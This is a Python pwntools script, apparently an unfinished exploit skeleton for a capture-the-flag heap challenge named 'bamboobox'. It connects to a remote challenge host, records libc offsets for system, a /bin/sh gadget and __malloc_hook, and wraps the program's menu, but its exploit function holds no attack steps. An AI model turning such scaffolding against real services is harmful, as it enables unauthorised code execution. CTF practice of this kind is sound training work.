from pwn import *
import time, sys

# local process envirnoment
LOCAL = False
elf_name = "./bamboobox"

#retmote args
remote_host = "140.113.209.24"
remote_port = 11005
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    smlbin_area_off = 0x3C3B78
    free_off = 0x83940
    system_off = 0x45390
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    context.log_level = "debug"
    mine_env = os.environ
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    #context.log_level = "debug"
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    free_off = 0x82DF0
    system_off = 0x46640
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.05)

def mmenu(mindex):
    io.recvuntil("your choice:")
    io.sendline(str(mindex))

def show_item():
    mmenu(1)

def add_item(length, mname):
    mmenu(2)
    io.recvuntil("the length of item name:")
    io.sendline(str(length))
    io.recvuntil("the name of item:")
    dlySend(mname)

def change_item(index, length, mname):
    mmenu(3)
    io.recvuntil("enter the index of item:")
    io.sendline(str(index))
    io.recvuntil("enter the length of item name:")
    io.sendline(str(length))
    io.recvuntil("the new name of the item:")
    dlySend(mname)

def remove_item(index):
    mmenu(4)
    io.recvuntil("enter the index of item:")
    io.sendline(str(index))

def mexit():
    mmenu(5)

def s_exp():
    ch_ptr = 0x6020E8
    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
